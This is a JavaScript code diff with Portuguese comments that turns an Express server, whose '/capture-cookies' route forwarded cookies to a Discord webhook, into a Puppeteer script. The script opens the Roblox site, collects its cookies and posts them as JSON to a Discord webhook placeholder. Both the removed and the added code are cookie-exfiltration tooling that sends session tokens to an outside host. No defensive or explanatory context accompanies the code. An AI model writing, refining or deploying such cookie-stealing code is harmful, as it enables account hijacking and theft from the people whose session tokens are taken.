@@ -1,39 +1,33 @@
-const express = require('express');
-const bodyParser = require('body-parser');
+const puppeteer = require('puppeteer');
 const fetch = require('node-fetch');
 
-const app = express();
-const port = 3000;
+async function main() {
+    const browser = await puppeteer.launch({ headless: false }); // Para ver o navegador em ação, troque para true para rodar em background
+    const page = await browser.newPage();
 
-// Middleware para analisar corpos de solicitação
-app.use(bodyParser.json());
+    // Abre o Roblox
+    await page.goto('https://www.roblox.com/', { waitUntil: 'networkidle2' });
 
-// Rota para capturar os cookies e enviar para o Discord
-app.post('/capture-cookies', (req, res) => {
-    const { cookies } = req.body;
+    // Captura os cookies
+    const cookies = await page.cookies();
 
-    // Enviar os cookies para o Discord webhook
-    fetch('https://discord.com/api/webhooks/SEU_WEBHOOK', {
+    // Envia os cookies para o Discord webhook
+    const webhookUrl = 'https://discord.com/api/webhooks/SEU_WEBHOOK';
+    const response = await fetch(webhookUrl, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
         },
-        body: JSON.stringify({ content: cookies }),
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Erro ao enviar cookies para o Discord');
-        }
-        console.log('Cookies enviados com sucesso para o Discord!');
-        res.sendStatus(200);
-    })
-    .catch(error => {
-        console.error('Erro:', error);
-        res.status(500).send('Erro ao enviar cookies para o Discord');
+        body: JSON.stringify({ content: JSON.stringify(cookies) }),
     });
-});
 
-// Iniciar o servidor
-app.listen(port, () => {
-    console.log(`Servidor escutando na porta ${port}`);
-});
+    if (response.ok) {
+        console.log('Cookies enviados com sucesso para o Discord!');
+    } else {
+        console.error('Erro ao enviar cookies para o Discord');
+    }
+
+    await browser.close();
+}
+
+main();
